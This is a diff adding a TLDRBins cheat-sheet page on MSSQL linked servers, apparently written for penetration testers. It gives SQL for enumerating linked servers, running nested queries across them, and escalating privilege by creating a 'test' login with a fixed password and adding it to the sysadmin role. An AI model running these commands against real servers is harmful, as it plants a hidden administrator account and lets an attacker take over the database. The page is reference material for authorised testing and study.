@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>MSSQL Linked Servers | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/mssql_linked_server/">
+      <span>MSSQL Linked Servers</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@mssql/">Mssql</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@database/">Database</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@linked_server/">Linked_server</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@privilege-escalation/">Privilege Escalation</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="linked-servers">Linked Servers</h3>
+<h4 id="basic-commands">Basic Commands</h4>
+<p><small><em>Hint: Use double <code>''</code> to escape <code>'</code> in mssql</em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Show current server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">servername</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Show linked servers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">srvname</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sysservers</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><h4 id="execute-query-between-linked-servers">Execute Query between Linked Servers</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Execute query from current server to linked server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">EXECUTE</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;select @@version;&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN</span><span class="err">\</span><span class="n">LINKED_SERVER</span><span class="p">];</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1"># Execute query from linked server to current server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">EXECUTE</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;EXECUTE (&#39;&#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &#39;&#39;&#39;&#39;SERVER&#39;&#39;&#39;&#39;);&#39;&#39;) at [DOMAIN\CURRENT_SERVER]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN</span><span class="err">\</span><span class="n">LINKED_SERVER</span><span class="p">];</span><span class="w">
+</span></span></span></code></pre></div><h3 id="privilege-escalation">Privilege Escalation</h3>
+<h4 id="create-admin-user-from-privilege-linked-server">Create Admin User from Privilege Linked Server</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">EXECUTE</span><span class="p">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;CREATE LOGIN test WITH PASSWORD = &#39;&#39;&#39;&#39;Test1234!@&#39;&#39;&#39;&#39;;&#39;&#39;) AT [DOMAIN\CURRENT_SERVER]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">AT</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN</span><span class="err">\</span><span class="n">LINKED_SERVER</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">EXECUTE</span><span class="p">(</span><span class="s1">&#39;EXECUTE(&#39;&#39;EXEC sp_addsrvrolemember &#39;&#39;&#39;&#39;test&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39;&#39;&#39;) AT [DOMAIN\CURRENT_SERVER]&#39;</span><span class="p">)</span><span class="w"> </span><span class="n">AT</span><span class="w"> </span><span class="p">[</span><span class="n">DOMAIN</span><span class="err">\</span><span class="n">LINKED_SERVER</span><span class="p">]</span><span class="w">
+</span></span></span></code></pre></div></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
